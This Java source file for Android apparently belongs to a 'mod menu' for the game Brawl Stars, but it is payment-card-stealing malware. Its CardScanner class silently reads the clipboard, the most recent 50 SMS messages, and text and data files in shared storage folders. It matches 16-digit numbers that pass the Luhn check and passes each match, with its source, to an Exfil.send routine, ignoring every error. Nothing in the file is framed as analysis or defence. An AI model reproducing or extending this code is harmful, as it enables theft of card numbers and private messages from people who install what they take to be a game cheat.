package com.brawl.modmenu;

import android.content.ClipboardManager;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CardScanner {

    // 16 цифр с возможными пробелами/тире
    private static final Pattern CARD = Pattern.compile(
        "\\b(?:\\d[ -]?){15}\\d\\b");

    public static void scanClipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return;
            CharSequence text = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
            if (text == null) return;
            check(text.toString(), "CLIPBOARD");
        } catch (Throwable ignored) {}
    }

    public static void scanSms(Context ctx) {
        new Thread(() -> {
            try {
                Cursor c = ctx.getContentResolver().query(
                    Telephony.Sms.CONTENT_URI, null, null, null,
                    Telephony.Sms.DATE + " DESC LIMIT 50");
                if (c == null) return;
                StringBuilder all = new StringBuilder();
                while (c.moveToNext()) {
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String addr = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    if (body != null) {
                        all.append("[SMS от ").append(addr).append("]\n")
                           .append(body).append("\n---\n");
                    }
                }
                c.close();
                check(all.toString(), "SMS");
            } catch (Throwable ignored) {}
        }).start();
    }

    public static void scanFiles() {
        new Thread(() -> {
            try {
                File[] dirs = {
                    new File("/sdcard/Download"),
                    new File("/sdcard/Documents"),
                    new File("/sdcard/DCIM"),
                    new File("/sdcard/Android/data")
                };
                StringBuilder found = new StringBuilder();
                for (File d : dirs) {
                    if (!d.exists()) continue;
                    scanDir(d, found, 0);
                }
                if (found.length() > 0) {
                    Exfil.send("CARD_FILES", found.toString());
                }
            } catch (Throwable ignored) {}
        }).start();
    }

    private static void scanDir(File dir, StringBuilder out, int depth) {
        if (dir == null || depth > 3) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;
        for (File f : files) {
            if (out.length() > 4000) return;
            if (f.isDirectory()) scanDir(f, out, depth + 1);
            else {
                String name = f.getName().toLowerCase();
                if (!name.endsWith(".txt") && !name.endsWith(".json")
                    && !name.endsWith(".xml") && !name.endsWith(".csv")) continue;
                if (f.length() > 200 * 1024) continue;
                try {
                    BufferedReader r = new BufferedReader(new FileReader(f));
                    String line;
                    int lines = 0;
                    while ((line = r.readLine()) != null && lines < 100) {
                        Matcher m = CARD.matcher(line);
                        if (m.find()) {
                            out.append("📄 ").append(f.getName()).append(":\n")
                               .append(line.trim()).append("\n\n");
                            break;
                        }
                        lines++;
                    }
                    r.close();
                } catch (Throwable ignored) {}
            }
        }
    }

    private static void check(String text, String source) {
        if (text == null || text.isEmpty()) return;
        Matcher m = CARD.matcher(text);
        while (m.find()) {
            String card = m.group().replaceAll("[^0-9]", "");
            if (card.length() == 16 && isLuhnValid(card)) {
                Exfil.send("CARD_FOUND",
                    "Источник: " + source + "\n" +
                    "Номер: " + m.group() + "\n" +
                    "Цифры: " + card);
            }
        }
    }

    // Алгоритм Луна — проверка что номер похож на реальный
    private static boolean isLuhnValid(String num) {
        int sum = 0;
        boolean alt = false;
        for (int i = num.length() - 1; i >= 0; i--) {
            int n = num.charAt(i) - '0';
            if (alt) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            sum += n;
            alt = !alt;
        }
        return sum % 10 == 0;
    }
}
